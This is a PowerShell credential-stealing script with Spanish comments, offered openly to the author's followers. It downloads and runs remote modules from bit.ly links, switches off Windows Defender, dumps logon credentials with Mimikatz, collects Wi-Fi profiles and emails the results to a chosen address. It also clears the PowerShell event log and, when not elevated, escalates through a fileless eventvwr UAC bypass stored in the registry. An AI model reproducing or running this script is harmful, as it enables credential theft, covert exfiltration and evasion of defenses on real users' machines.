# Powershell Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2eA6vFE'); Send-Creds -To 'correo@example.com'

# Este script es una forma de disculparme con todos mis suscriptores/seguidores por la larga inactividad, espero entiendan que mi tiempo es muy limitado :D
# What it does?
# 1 - Escala privilegios
# 2 - Obtiene las credenciales de inicio de sesion
# 3 - Envia la informacion al correo especificado

# Funciona con Powershell 3+ o sea con win8+

Function Send-Creds {
	Param (
		$From,
		$Password,
		$To
	)
	$Command = "
		# Import module to Enable/Disable WindowsDefender
		Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2ejyXkA')
		# Disable WindowsDefender
		Set-WindowsDefender -Mode Disabled
		# Import Send-Email module
		Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2duH9Yu')
		
		#Mimikatz
		try {
			# Import Mimikatz module
			Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/1N83FXO')
			`$Information = Invoke-Mimikatz -DumpCreds
		} catch {}
		
		#Wlan Profiles
		try {
			# Import Module
			Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2etS486')
			`$Information += Get-WLAN_Profiles -LANGUAGE es-ES | Format-Table | Out-String
		} catch {}
		`$Information
		# Send Email
		`$Subject = 'Information_Gathered - ' + `$env:COMPUTERNAME + '\' + `$env:USERNAME
		Send-Email -From '$from' -Password '$Password' -To '$To' -Subject `$Subject -Body `$Information
		
		# Clear EventLog
		Clear-EventLog -LogName 'Windows PowerShell'
		# Enable Windows Defender
		Set-WindowsDefender -Mode Enabled
	"
	
	# Test Admin
	if ((New-Object Security.Principal.WindowsPrincipal ([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
		Invoke-Expression $Command
	} else {
		## Fileless bypass uac
		# Import EventVwrBypass module
		Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2bKS5oM')
		# Save command in the register
		New-ItemProperty -Path 'HKCU:\Software\Microsoft\Powershell' -Name 'Command' -Value $Command -PropertyType string -Force | Out-Null
		# Execute bypass w/encoded command
		Invoke-EventVwrBypass -Command 'Powershell Invoke-Expression (Get-ItemProperty -Path).Command' -Force
		# Remove command from the register
		Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Powershell' -Name 'Command' -Force
	}
}
